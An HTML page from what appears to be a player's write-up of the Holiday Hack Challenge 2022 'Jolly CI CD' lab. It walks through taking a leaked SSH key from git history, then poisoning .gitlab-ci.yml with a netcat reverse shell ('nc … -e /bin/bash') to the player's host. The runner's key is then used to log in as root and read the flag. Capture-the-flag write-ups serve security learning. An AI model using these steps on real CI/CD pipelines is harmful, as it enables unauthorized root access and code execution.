@@ -1,0 +1,1150 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+      
+      
+      <link rel="icon" href="../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.4.2, mkdocs-material-8.5.10">
+    
+    
+      
+        <title>3. Jolly CI CD - Holiday Hack Challenge 2022</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../assets/stylesheets/main.975780f9.min.css">
+      
+        
+        <link rel="stylesheet" href="../../assets/stylesheets/palette.2505c338.min.css">
+        
+      
+      
+
+    
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+    <script>__md_scope=new URL("../..",location),__md_hash=e=>[...e].reduce((e,_)=>(e<<5)-e+_.charCodeAt(0),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+    
+  </head>
+  
+  
+    
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="None" data-md-color-accent="None">
+  
+    
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#chat-with-rippin-proudboot" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+<header class="md-header" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href="../.." title="Holiday Hack Challenge 2022" class="md-header__button md-logo" aria-label="Holiday Hack Challenge 2022" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54Z"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3V6m0 5h18v2H3v-2m0 5h18v2H3v-2Z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            Holiday Hack Challenge 2022
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              3. Jolly CI CD
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+    
+    
+      <label class="md-header__button md-icon" for="__search">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"/></svg>
+      </label>
+      <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"/></svg>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12Z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Search">
+        
+        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12 19 6.41Z"/></svg>
+        </button>
+      </nav>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../.." title="Holiday Hack Challenge 2022" class="md-nav__button md-logo" aria-label="Holiday Hack Challenge 2022" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54Z"/></svg>
+
+    </a>
+    Holiday Hack Challenge 2022
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+      
+
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../.." class="md-nav__link">
+        KringleCon 2022
+      </a>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../0.%20KringleCon%20Orientation/" class="md-nav__link">
+        0. KringleCon Orientation
+      </a>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../6.%20Finale/" class="md-nav__link">
+        6. Finale
+      </a>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_4" type="checkbox" id="__nav_4" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_4">
+          1. Recover the Tolkien Ring
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="1. Recover the Tolkien Ring" data-md-level="1">
+        <label class="md-nav__title" for="__nav_4">
+          <span class="md-nav__icon md-icon"></span>
+          1. Recover the Tolkien Ring
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../1.%20Recover%20the%20Tolkien%20Ring/1.%20Wireshark%20Practise/" class="md-nav__link">
+        1. Wireshark Practise
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../1.%20Recover%20the%20Tolkien%20Ring/2.%20Windows%20Event%20Logs/" class="md-nav__link">
+        2. Windows Event Logs
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../1.%20Recover%20the%20Tolkien%20Ring/3.%20Suricata%20Regatta/" class="md-nav__link">
+        3. Suricata Regatta
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+    
+  
+  
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_5" type="checkbox" id="__nav_5" checked>
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_5">
+          2. Recover the Elfen Ring
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="2. Recover the Elfen Ring" data-md-level="1">
+        <label class="md-nav__title" for="__nav_5">
+          <span class="md-nav__icon md-icon"></span>
+          2. Recover the Elfen Ring
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../1.%20Clone%20with%20a%20Difference/" class="md-nav__link">
+        1. Clone with a Difference
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../2.%20Prison%20Escape/" class="md-nav__link">
+        2. Prison Escape
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+    
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" data-md-toggle="toc" type="checkbox" id="__toc">
+      
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          3. Jolly CI CD
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        3. Jolly CI CD
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#chat-with-rippin-proudboot" class="md-nav__link">
+    Chat with Rippin Proudboot
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#terminal" class="md-nav__link">
+    Terminal
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#rejoice" class="md-nav__link">
+    Rejoice
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#chat-with-grinchum" class="md-nav__link">
+    Chat with Grinchum
+  </a>
+  
+    <nav class="md-nav" aria-label="Chat with Grinchum">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#find-the-next-objective" class="md-nav__link">
+    Find the Next Objective
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_6" type="checkbox" id="__nav_6" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_6">
+          3. Recover the Web Ring
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="3. Recover the Web Ring" data-md-level="1">
+        <label class="md-nav__title" for="__nav_6">
+          <span class="md-nav__icon md-icon"></span>
+          3. Recover the Web Ring
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../3.%20Recover%20the%20Web%20Ring/2.%20Open%20Boria%20Mine%20Door/" class="md-nav__link">
+        2. Open Boria Mine Door
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../3.%20Recover%20the%20Web%20Ring/3.%20Glamtariel%27s%20Fountain/" class="md-nav__link">
+        3. Glamtariel's Fountain
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_6_3" type="checkbox" id="__nav_6_3" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_6_3">
+          1. Boria PCAP Mining
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="1. Boria PCAP Mining" data-md-level="2">
+        <label class="md-nav__title" for="__nav_6_3">
+          <span class="md-nav__icon md-icon"></span>
+          1. Boria PCAP Mining
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../3.%20Recover%20the%20Web%20Ring/1.%20Boria%20PCAP%20Mining/1.%20Naughty%20IP/" class="md-nav__link">
+        1. Naughty IP
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../3.%20Recover%20the%20Web%20Ring/1.%20Boria%20PCAP%20Mining/2.%20Credential%20Mining/" class="md-nav__link">
+        2. Credential Mining
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../3.%20Recover%20the%20Web%20Ring/1.%20Boria%20PCAP%20Mining/3.%20404%20FTW/" class="md-nav__link">
+        3. 404 FTW
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../3.%20Recover%20the%20Web%20Ring/1.%20Boria%20PCAP%20Mining/4.%20IMDS%2C%20XXE%2C%20and%20Other%20Abbreviations/" class="md-nav__link">
+        4. IMDS, XXE, and Other Abbreviations
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_7" type="checkbox" id="__nav_7" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_7">
+          4. Recover the Cloud Ring
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="4. Recover the Cloud Ring" data-md-level="1">
+        <label class="md-nav__title" for="__nav_7">
+          <span class="md-nav__icon md-icon"></span>
+          4. Recover the Cloud Ring
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../4.%20Recover%20the%20Cloud%20Ring/1.%20AWS%20CLI%20Intro/" class="md-nav__link">
+        1. AWS CLI Intro
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../4.%20Recover%20the%20Cloud%20Ring/2.%20Trufflehog%20Search/" class="md-nav__link">
+        2. Trufflehog Search
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../4.%20Recover%20the%20Cloud%20Ring/3.%20Exploitation%20via%20AWS%20CLI/" class="md-nav__link">
+        3. Exploitation via AWS CLI
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_8" type="checkbox" id="__nav_8" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_8">
+          5. Recover the Burning Ring of Fire
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="5. Recover the Burning Ring of Fire" data-md-level="1">
+        <label class="md-nav__title" for="__nav_8">
+          <span class="md-nav__icon md-icon"></span>
+          5. Recover the Burning Ring of Fire
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../5.%20Recover%20the%20Burning%20Ring%20of%20Fire/1.%20Buy%20a%20Hat/" class="md-nav__link">
+        1. Buy a Hat
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../5.%20Recover%20the%20Burning%20Ring%20of%20Fire/2.%20Blockchain%20Divination/" class="md-nav__link">
+        2. Blockchain Divination
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../5.%20Recover%20the%20Burning%20Ring%20of%20Fire/3.%20Exploit%20a%20Smart%20Contract/" class="md-nav__link">
+        3. Exploit a Smart Contract
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#chat-with-rippin-proudboot" class="md-nav__link">
+    Chat with Rippin Proudboot
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#terminal" class="md-nav__link">
+    Terminal
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#rejoice" class="md-nav__link">
+    Rejoice
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#chat-with-grinchum" class="md-nav__link">
+    Chat with Grinchum
+  </a>
+  
+    <nav class="md-nav" aria-label="Chat with Grinchum">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#find-the-next-objective" class="md-nav__link">
+    Find the Next Objective
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+
+<p>Exploit a CI/CD pipeline. Get hints for this challenge from Tinsel Upatree in the Elfen Ring.</p>
+<p>Difficulty: 5/5</p>
+<h2 id="chat-with-rippin-proudboot">Chat with Rippin Proudboot</h2>
+<p>Have you managed to help Tinsel with his prison escape?</p>
+<p>...</p>
+<p>Yes, hello, I'm Rippin Proudboot. Can I help you?</p>
+<p>Oh, you'd like to help me? Well, I'm not quite sure you can, but we shall see.</p>
+<p>The elves here introduced me to this new CI/CD technology. It seems quite efficient.</p>
+<p>Unfortunately, the sporcs seem to have gotten their grubby mits on it as well, along with the Elfen Ring.</p>
+<p>They've used CI/CD to launch a website, and the Elfen Ring to power it.</p>
+<p>Might you be able to check for any misconfigurations or vulnerabilities in their CI/CD pipeline?</p>
+<p>If you do find anything, use it to exploit the website, and get the ring back!</p>
+<h2 id="terminal">Terminal</h2>
+<pre><code>
+Greetings Noble Player, 
+
+Many thanks for answering our desperate cry for help!
+
+You may have heard that some evil Sporcs have opened up a web-store selling 
+counterfeit banners and flags of the many noble houses found in the land of 
+the North! They have leveraged some dastardly technology to power their 
+storefront, and this technology is known as PHP! 
+
+***gasp*** 
+
+This strorefront utilizes a truly despicable amount of resources to keep the 
+website up. And there is only a certain type of Christmas Magic capable of 
+powering such a thing… an Elfen Ring!
+
+Along with PHP there is something new we've not yet seen in our land. 
+A technology called Continuous Integration and Continuous Deployment! 
+
+Be wary! 
+
+Many fair elves have suffered greatly but in doing so, they've managed to 
+secure you a persistent connection on an internal network. 
+
+BTW take excellent notes! 
+
+Should you lose your connection or be discovered and evicted the 
+elves can work to re-establish persistence. In fact, the sound off fans
+and the sag in lighting tells me all the systems are booting up again right now.  
+
+Please, for the sake of our Holiday help us recover the Ring and save Christmas!
+</code></pre>
+<p>Referring back to the conversation with Tinsel Upatree:</p>
+<blockquote>
+<p>WHOOPS! I didn’t mean to commit that to http://gitlab.flag.net.internal/rings-of-powder/wordpress.flag.net.internal.git...</p>
+<p>Unfortunately, if attackers can get in that pipeline, they can make an awful mess of things!</p>
+</blockquote>
+<p>Let's verify that the gitlab endpoint is up:</p>
+<pre><code>PING gitlab.flag.net.internal (172.18.0.150): 56 data bytes
+64 bytes from 172.18.0.150: seq=0 ttl=42 time=0.343 ms
+64 bytes from 172.18.0.150: seq=1 ttl=42 time=0.079 ms
+64 bytes from 172.18.0.150: seq=2 ttl=42 time=0.084 ms
+64 bytes from 172.18.0.150: seq=3 ttl=42 time=0.084 ms
+64 bytes from 172.18.0.150: seq=4 ttl=42 time=0.252 ms
+^C
+</code></pre>
+<p>Now, let's clone the repo.</p>
+<pre><code>grinchum-land:~$ git clone http://gitlab.flag.net.internal/rings-of-powder/wordpress.flag.net.internal.git
+Cloning into 'wordpress.flag.net.internal'...
+remote: Enumerating objects: 10195, done.
+remote: Total 10195 (delta 0), reused 0 (delta 0), pack-reused 10195
+Receiving objects: 100% (10195/10195), 36.49 MiB | 20.29 MiB/s, done.
+Resolving deltas: 100% (1799/1799), done.
+Updating files: 100% (9320/9320), done.
+</code></pre>
+<p>Looking through the commit history we find a private key.
+<code>git diff abdea0ebb21b156c01f7533cea3b895c26198c98 e19f653bde9ea3de6af21a587e41e7a909db1ca5</code></p>
+<pre><code>diff --git a/.ssh/.deploy b/.ssh/.deploy
+new file mode 100644
+index 0000000..3f7a9e3
+--- /dev/null
++++ b/.ssh/.deploy
+@@ -0,0 +1,7 @@
++-----BEGIN OPENSSH PRIVATE KEY-----
++b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
++QyNTUxOQAAACD+wLHSOxzr5OKYjnMC2Xw6LT6gY9rQ6vTQXU1JG2Qa4gAAAJiQFTn3kBU5
++9wAAAAtzc2gtZWQyNTUxOQAAACD+wLHSOxzr5OKYjnMC2Xw6LT6gY9rQ6vTQXU1JG2Qa4g
++AAAEBL0qH+iiHi9Khw6QtD6+DHwFwYc50cwR0HjNsfOVXOcv7AsdI7HOvk4piOcwLZfDot
++PqBj2tDq9NBdTUkbZBriAAAAFHNwb3J4QGtyaW5nbGVjb24uY29tAQ==
++-----END OPENSSH PRIVATE KEY-----
+</code></pre>
+<p>Let's copy the private key in the location <code>.ssh/id_rsa</code></p>
+<pre><code>-----BEGIN OPENSSH PRIVATE KEY-----
+b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
+QyNTUxOQAAACD+wLHSOxzr5OKYjnMC2Xw6LT6gY9rQ6vTQXU1JG2Qa4gAAAJiQFTn3kBU5
+9wAAAAtzc2gtZWQyNTUxOQAAACD+wLHSOxzr5OKYjnMC2Xw6LT6gY9rQ6vTQXU1JG2Qa4g
+AAAEBL0qH+iiHi9Khw6QtD6+DHwFwYc50cwR0HjNsfOVXOcv7AsdI7HOvk4piOcwLZfDot
+PqBj2tDq9NBdTUkbZBriAAAAFHNwb3J4QGtyaW5nbGVjb24uY29tAQ==
+-----END OPENSSH PRIVATE KEY-----
+</code></pre>
+<pre><code>grinchum-land:~$ cat .ssh/id_rsa 
+-----BEGIN OPENSSH PRIVATE KEY-----
+b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
+QyNTUxOQAAACD+wLHSOxzr5OKYjnMC2Xw6LT6gY9rQ6vTQXU1JG2Qa4gAAAJiQFTn3kBU5
+9wAAAAtzc2gtZWQyNTUxOQAAACD+wLHSOxzr5OKYjnMC2Xw6LT6gY9rQ6vTQXU1JG2Qa4g
+AAAEBL0qH+iiHi9Khw6QtD6+DHwFwYc50cwR0HjNsfOVXOcv7AsdI7HOvk4piOcwLZfDot
+PqBj2tDq9NBdTUkbZBriAAAAFHNwb3J4QGtyaW5nbGVjb24uY29tAQ==
+-----END OPENSSH PRIVATE KEY-----
+</code></pre>
+<p>Next, let's clone the repo using ssh. This should give us advanced privileges.</p>
+<pre><code>grinchum-land:~$ git clone git@gitlab.flag.net.internal:rings-of-powder/wordpress.flag.net.internal.git new
+Cloning into 'new'...
+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+@         WARNING: UNPROTECTED PRIVATE KEY FILE!          @
+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+Permissions 0644 for '/home/samways/.ssh/id_rsa' are too open.
+It is required that your private key files are NOT accessible by others.
+This private key will be ignored.
+Load key &quot;/home/samways/.ssh/id_rsa&quot;: bad permissions
+git@gitlab.flag.net.internal: Permission denied (publickey).
+fatal: Could not read from remote repository.
+
+Please make sure you have the correct access rights
+and the repository exists.
+</code></pre>
+<pre><code>grinchum-land:~$ chmod 600 ~/.ssh/id_rsa 
+grinchum-land:~$ git clone git@gitlab.flag.net.internal:rings-of-powder/wordpress.flag.net.internal.git new
+Cloning into 'new'...
+remote: Enumerating objects: 10195, done.
+remote: Total 10195 (delta 0), reused 0 (delta 0), pack-reused 10195
+Receiving objects: 100% (10195/10195), 36.49 MiB | 20.30 MiB/s, done.
+Resolving deltas: 100% (1799/1799), done.
+Updating files: 100% (9320/9320), done.
+</code></pre>
+<p>Let's inspect the .gitlab-ci.yml file as this controls the CI CD pipeline. The runner has access to the private key for the root user at wordpress.flag.net.internal which it uses to copy website files.</p>
+<pre><code>grinchum-land:~$ ls
+wordpress.flag.net.internal
+grinchum-land:~$ cd wordpress.flag.net.internal/
+grinchum-land:~/wordpress.flag.net.internal$ ls -a
+.     .gitlab-ci.yml  readme.html      wp-blog-header.php    wp-config.php  wp-includes        wp-login.php     wp-signup.php
+..    index.php       wp-activate.php  wp-comments-post.php  wp-content     wp-links-opml.php  wp-mail.php      wp-trackback.php
+.git  license.txt     wp-admin         wp-config-sample.php  wp-cron.php    wp-load.php        wp-settings.php  xmlrpc.php
+grinchum-land:~/wordpress.flag.net.internal$ cat .gitlab-ci.yml 
+stages:
+  - deploy
+
+deploy-job:      
+  stage: deploy 
+  environment: production
+  script:
+    - rsync -e &quot;ssh -i /etc/gitlab-runner/hhc22-wordpress-deploy&quot; --chown=www-data:www-data -atv --delete --progress ./ root@wordpress.flag.net.internal:/var/www/html
+grinchum-land:~/wordpress.flag.net.internal$
+</code></pre>
+<p>I spun up an HTTP server using <code>python3 -m http.server</code> and modified the file like so, to get the gitlab runner to execute an HTTP server to my server, but that didn't work.</p>
+<pre><code>diff --git a/.gitlab-ci.yml b/.gitlab-ci.yml
+index 02a0dde..795d1bd 100644
+--- a/.gitlab-ci.yml
++++ b/.gitlab-ci.yml
+@@ -5,4 +5,4 @@ deploy-job:
+   stage: deploy 
+   environment: production
+   script:
+-    - curl http://172.18.0.99:8000?teset=trueeeeeeeeeeeee
++    - curl &quot;http://172.18.0.99:8000?teset=trueeeeeeeeeeeee&quot;
+</code></pre>
+<p>I also tried wrapping the command in quotes based on this doc: https://docs.gitlab.com/ee/ci/yaml/script.html#use-special-characters-with-script. Still didn't work. I concluded that curl is not supported on the gitlab runner.</p>
+<p>Next, I tried a netcat based approach. I set up a netcat listener on port 4444 and committed the following change:</p>
+<pre><code>grinchum-land:~/wordpress.flag.net.internal$ cat .gitlab-ci.yml 
+stages:
+  - deploy
+
+deploy-job:      
+  stage: deploy 
+  environment: production
+  script:
+    - rsync -e &quot;ssh -i /etc/gitlab-runner/hhc22-wordpress-deploy&quot; --chown=www-data:www-data -atv --delete --progress ./ root@wordpress.flag.net.internal:/var/www/html
+    - nc 172.18.0.99 4444 -e /bin/bash
+  ```
+
+Soon...
+</code></pre>
+<p>grinchum-land:~$ nc -nlvp 4444
+Listening on [0.0.0.0] (family 0, port 4444)
+Connection from 172.18.1.149 35659 received!</p>
+<pre><code>
+Now, let's use the private key to login to wordpress.flag.net.internal as root.
+
+</code></pre>
+<p>ssh -i /etc/gitlab-runner/hhc22-wordpress-deploy root@wordpress.flag.net.internal
+Linux wordpress.flag.net.internal 5.10.51 #1 SMP Mon Jul 19 19:08:01 UTC 2021 x86_64</p>
+<p>The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.</p>
+<p>Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+whoami
+root</p>
+<pre><code>
+</code></pre>
+<p>ls
+pwd
+/root</p>
+<p>ls
+cd ..
+ls
+bin
+boot
+dev
+etc
+flag.txt
+home
+lib
+lib64
+media
+mnt
+opt
+proc
+root
+run
+sbin
+srv
+sys
+tmp
+usr
+var
+```</p>
+<p>read flag.txt to obtain the required flag.</p>
+<p><code>oI40zIuCcN8c3MhKgQjOMN8lfYtVqcKT</code></p>
+<h2 id="rejoice">Rejoice</h2>
+<p>How unexpected, you were actually able to help!</p>
+<p>Well, then I must apoligize for my dubious greeting.</p>
